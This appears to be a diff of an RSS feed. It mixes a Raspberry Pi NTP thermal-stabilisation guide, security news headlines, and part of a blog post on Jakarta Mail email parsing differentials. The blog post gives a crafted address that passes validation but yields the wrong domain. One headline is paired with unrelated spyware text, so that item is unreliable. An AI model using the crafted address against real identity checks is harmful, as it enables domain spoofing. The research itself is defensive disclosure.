-sudo apt-get install linux-cpupower python3 util-linuxStep 1: Create the Boot Optimization ScriptSave the optimization script from earlier as /usr/local/bin/pps-optimize.sh:sudo nano /usr/local/bin/pps-optimize.sh
-# Paste the script content
-sudo chmod +x /usr/local/bin/pps-optimize.shStep 2: Create Systemd Service for Boot ScriptCreate /etc/systemd/system/pps-optimize.service:[Unit]
-Description=PPS NTP Performance Optimization
-After=chronyd.service
-Requires=chronyd.service
-
-[Service]
-Type=oneshot
-ExecStart=/usr/local/bin/pps-optimize.sh
-RemainAfterExit=yes
-
-[Install]
-WantedBy=multi-user.targetsudo systemctl enable pps-optimize.serviceStep 3: Install the Time Burner ScriptSave the time burner Python script as /usr/local/bin/time_burner.py:sudo nano /usr/local/bin/time_burner.py
-# Paste the full time burner script
-sudo chmod +x /usr/local/bin/time_burner.pyStep 4: Create Systemd Service for Time BurnerCreate /etc/systemd/system/time-burner.service:[Unit]
-Description=CPU Thermal Stabilization for NTP
-After=network.target
-
-[Service]
-Type=simple
-User=root
-ExecStart=/usr/bin/python3 /usr/local/bin/time_burner.py -t 54.0 -n 3
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.targetsudo systemctl enable time-burner.service
-sudo systemctl start time-burner.serviceCheck that everything is running:# Verify CPU governor
-cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
-# Should output: performance
-
-# Check chronyd CPU affinity and priority
-ps -eo pid,comm,psr,ni,rtprio | grep chronyd
-# Should show psr=0 (CPU 0) and rtprio=50
-
-# Check time burner processes
-ps aux | grep time_burner
-# Should show 4 processes (1 main + 3 workers)
-
-# Monitor NTP performance
-chronyc trackingExample output from :Reference ID    : 50505300 (PPS)
-Stratum         : 1
-Ref time (UTC)  : Sun Nov 24 16:45:23 2025
-System time     : 0.000000038 seconds fast of NTP time
-Last offset     : -0.000000012 seconds
-RMS offset      : 0.000000035 seconds
-Frequency       : 1.685 ppm slow
-Residual freq   : -0.001 ppm
-Skew            : 0.002 ppm
-Root delay      : 0.000000001 seconds
-Root dispersion : 0.000010521 seconds
-Update interval : 16.0 seconds
-Leap status     : NormalNotice the RMS offset of 35 nanoseconds – this is the kind of accuracy you can achieve with thermal stabilization.Step 6: Monitor Over Time(Topic for a future post)Set up Grafana dashboards to monitor:You’ll see the frequency stabilize within a few hours as the PID controller locks onto the target temperature.Monitoring and TroubleshootingWatch chronyd tracking in real-time:watch -n 1 "chronyc tracking"Check time burner status:sudo systemctl status time-burner.servicesudo journalctl -u time-burner.service -fTemperature overshoots or oscillates:Adjust PID gains – reduce Kp if oscillating, increase Ki if steady-state errorTry different target temperatures (50-60°C range)High CPU usage (obviously):This is intentional – the time burner uses ~90% of 3 coresNot suitable for Pis running other workloadsChronyd not pinned to CPU 0:Check that the optimization script runs after chronyd startsAdjust the timing in the systemd service dependenciesTrade-offs and ConsiderationsLet’s be honest about the downsides:The time burner keeps 3 cores at ~30% average utilization. My Pi now draws about 3-4W continuously (vs 1-2W idle). Over a year, that’s an extra 15-25 kWh, or about $2-3 in electricity (depending on your rates).Running at 54°C means the Pi is warm to the touch. This is well within safe operating temperature (thermal throttling doesn’t start until 80°C), but you might want to ensure adequate ventilation. I added a small heatsink just to be safe.You’re dedicating 3 of 4 cores to burning cycles. This is fine for a dedicated NTP server, but not suitable if you’re running other services on the same Pi. That said, I am also running the feeder to my new ADS-B aircraft visualization app on it. My readsb instance regularly gets to 1200 msg/s with 200+ aircraft.For 99.999% of use cases: .Most applications don’t need better than millisecond accuracy, let alone the 35-nanosecond RMS offset I’m achieving. Even for distributed systems, microsecond-level accuracy is typically overkill.When this might make sense:Precision timing applications (scientific instrumentation, radio astronomy)Distributed systems research requiring tight clock synchronization where timing precision affects results (the best reason for any homelab project)For me, this falls squarely in the “because you can” category. I had the monitoring infrastructure in place, noticed the thermal correlation, and couldn’t resist solving the problem. Plus, I learned a lot about PID control, CPU thermal characteristics, and Linux real-time scheduling.Some ideas I’m considering:The current PID gains are hand-tuned for a specific ambient temperature range. The fairly low P value is to avoid spikes when some load on the Pi kicks up the temp. The I is a balance to keep long term “burn” relatively consistent. Implementing an auto-tuning algorithm (like Ziegler-Nichols) or adaptive PID could handle seasonal temperature variations better.Instead of software thermal control, I could add an actively cooled heatsink with PWM fan control. This might achieve similar temperature stability while using less power overall.Oven-Controlled Crystal Oscillator (OCXO)For the ultimate in frequency stability, replacing the Pi’s crystal with a temperature-controlled OCXO would eliminate thermal drift at the source. This is how professional timing equipment works. I do have a BH3SAP GPSDO sitting next to me (subject to a future post)… Then again, I’m the person who just wrote 4000 words about optimizing a $50 time server, so who am I kidding?Through a combination of CPU core isolation and PID-controlled thermal stabilization, I achieved: in frequency variability in frequency standard deviation in frequency range in RMS offsetThe system now maintains 38-nanosecond median RMS offset from the GPS PPS reference, with frequency drift that’s barely detectable in the noise. The CPU runs at a constant 54°C, and in steady state, the frequency offset stays within a tight ±0.14 PPM band (compared to ±0.52 PPM before optimization).Was this necessary? No. Did I learn a bunch about thermal management, PID control, and Linux real-time scheduling? Yes. Would I do it again? Absolutely.I did come across a “burn” script that was the basis for this thermal management. I can’t find it at the moment, but when I do I’ll link it here.Have questions or suggestions? Drop a comment below. I’m particularly interested to hear if anyone has tried alternative thermal management approaches or has experience with OCXO modules for Raspberry Pi timing applications.Thanks for reading, and happy timekeeping!]]></content:encoded></item><item><title>CRITICAL: Fluent Bit Flaws Enable RCE and Telemetry Tampering in Major Orgs</title><link>https://securityonline.info/critical-fluent-bit-flaws-enable-rce-and-telemetry-tampering-in-major-orgs/</link><author></author><category>security</category><pubDate>Tue, 25 Nov 2025 03:07:31 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
+"These cyber actors use sophisticated targeting and social engineering techniques to deliver spyware and gain unauthorized access to a victim's messaging app,]]></content:encoded></item><item><title>CRITICAL: Fluent Bit Flaws Enable RCE and Telemetry Tampering in Major Orgs</title><link>https://securityonline.info/critical-fluent-bit-flaws-enable-rce-and-telemetry-tampering-in-major-orgs/</link><author></author><category>security</category><pubDate>Tue, 25 Nov 2025 03:07:31 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
             Oligo Security researchers have uncovered a dangerous chain of vulnerabilities in Fluent Bit, the popular, lightweight telemetry agent used by major organizations—including in finance, delivery apps,  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>NVIDIA’s Isaac-GROOT Robotics Platform Vulnerability Let Attackers Inject Malicious Codes</title><link>https://cybersecuritynews.com/nvidias-isaac-groot-robotics-platform-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 25 Nov 2025 03:03:16 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
             NVIDIA has disclosed two critical code injection vulnerabilities affecting its Isaac-GR00T robotics platform.
 The vulnerabilities, tracked as CVE-2025-33183 and CVE-2025-33184, exist within Python com ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Apache Syncope Flaw (CVE-2025-65998) Exposes Encrypted User Passwords Due to Hard-Coded AES Key</title><link>https://securityonline.info/apache-syncope-flaw-cve-2025-65998-exposes-encrypted-user-passwords-due-to-hard-coded-aes-key/</link><author></author><category>security</category><pubDate>Tue, 25 Nov 2025 02:52:45 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
@@ -3943,4 +3765,4 @@ As we now know that “valid email format” can potentially mean complex lookin
 What I’ve found was that the default pattern is very restrictive and is  RFC 2047 compliant (no encoded strings 🙁).When validation is triggered via the  annotation, the EmailValidator class is used to perform the checks.
 It then calls its parent class  to validate the email string, which also uses DomainNameUtil to perform domain name validation.In the default regex, validation is split into two sections: local and domain, where the former is everything before the  while the latter is everything after.
 It gets really intense as seen below:With a bit of experimentation, I found that the email address "foo@bar.com@"@example.com will pass the default regex validation.
-This means that if an application naively checks the domain of an email address with , it will pull the incorrect domain.If you have made it this far, I hope you have learnt something new and/or have some research ideas on your own about email parsers. Note that the ideas we have explored are not limited to Jakarta Mail but can be extended to any application that uses email addresses to establish identities. As long as developers are not fully aware of how the libraries they are using are parsing email addresses, there will always be the possibility of email parsing differentials.The next time you encounter Jakarta Mail or any libraries that uses it, be sure to take a closer look to see if the application makes any assumptions about how emails are parsed by this library. If only there are some Semgrep rules to help you out… oh wait - here it is!This blog post is based on the talks that I gave in BSides Canberra and BSides Perth 2025. You can find the slide deck here.Checklist for Jakarta MailA list of primitives to look out for.]]></content:encoded></item><item><title>KongTuke activity, (Tue, Nov 18th)</title><link>https://isc.sans.edu/diary/rss/32498</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 07:10:17 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item></channel></rss>
+This means that if an application naively checks the domain of an email address with , it will pull the incorrect domain.If you have made it this far, I hope you have learnt something new and/or have some research ideas on your own about email parsers. Note that the ideas we have explored are not limited to Jakarta Mail but can be extended to any application that uses email addresses to establish identities. As long as developers are not fully aware of how the libraries they are using are parsing email addresses, there will always be the possibility of email parsing differentials.The next time you encounter Jakarta Mail or any libraries that uses it, be sure to take a closer look to see if the application makes any assumptions about how emails are parsed by this library. If only there are some Semgrep rules to help you out… oh wait - here it is!This blog post is based on the talks that I gave in BSides Canberra and BSides Perth 2025. You can find the slide deck here.Checklist for Jakarta MailA list of primitives to look out for.]]></content:encoded></item></channel></rss>
